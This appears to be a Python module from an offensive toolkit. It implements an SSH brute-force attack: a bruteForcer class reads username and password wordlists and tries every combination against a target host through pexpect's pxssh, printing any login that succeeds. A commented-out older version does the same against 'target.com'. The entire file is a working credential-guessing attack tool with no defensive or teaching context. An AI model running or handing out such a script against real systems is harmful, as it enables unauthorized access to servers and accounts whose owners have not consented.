#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pexpect import pxssh
import sys
from lib.config import readFile


class bruteForcer():
    def __init__(self, user_path, pass_path, target):
        self.target = target 
        self.user_path = user_path
        self.pass_path = pass_path

    def brute(self, user, _pass):
        server = pxssh.pxssh()
        print("Checking: {}/{}".format(user, _pass))
        try: 
            if server.login(self.target, user, _pass):
                print("Credential access: {}/{}".format(user, _pass))
            else:
                print("failed 1")
        except:
            print("failed 2")

    def run(self):

        username = readFile(self.user_path).splitlines()
        password = readFile(self.pass_path).splitlines()
        for user in username:
            for _pass in password:
                self.brute(user, _pass)
        # print(username)
        # for user in username


# server = pxssh.pxssh()

# def bruteForcer(target, user, _pass):
#     print "Checking: %s/%s" % (user, _pass)
#     try:
#         if server.login(target, user, _pass):
#             print "Credentials Found: %s/%s" % (user, _pass)
#             sys.exit(0)
#         else:
#             pass
#     except:
#         pass

# username_dict = '/root/Desktop/usernames.txt'
# password_dict = '/root/Desktop/passwords.txt'

# if __name__ == '__main__':
#     user_names = open(username_dict)
#     pass_words = open(password_dict)
#     for user in user_names.read().splitlines():
#         for _pass in pass_words.read().splitlines():
#             bruteForcer('target.com', user.rstrip('\n'), _pass.rstrip('\n'))
